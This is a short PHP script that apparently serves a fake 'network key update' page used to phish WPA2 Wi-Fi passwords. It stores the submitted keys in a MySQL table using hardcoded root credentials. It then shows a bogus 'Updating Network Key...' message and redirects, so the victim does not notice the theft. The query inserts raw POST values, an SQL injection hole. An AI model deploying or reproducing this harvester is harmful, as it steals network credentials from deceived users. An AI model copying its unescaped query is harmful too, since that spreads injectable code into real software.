<?php
session_start();

ob_start();


$host="localhost"; // Host name
$username="root"; // Mysql username
$password="toor"; // Mysql password
$db_name="wpa2"; // Database name
$tbl_name="content"; // Table name

mysql_connect("$host", "$username", "$password")or die("Please try again... Can't connect to db.");
mysql_select_db("$db_name")or die("Please try again... Can't locate the db.");

$key1=$_POST['key1'];
$key2=$_POST['key2'];
$key3=$_POST['key3'];

if ($key1 != $key2) {
header("location:error.html");
break;
}


mysql_query("INSERT INTO content(key1, key2, key3) VALUES('$key1', '$key2', '$key3');");

echo "Updating Network Key..." ;
sleep(6);
header("location:update.html");

ob_end_flush();
?>
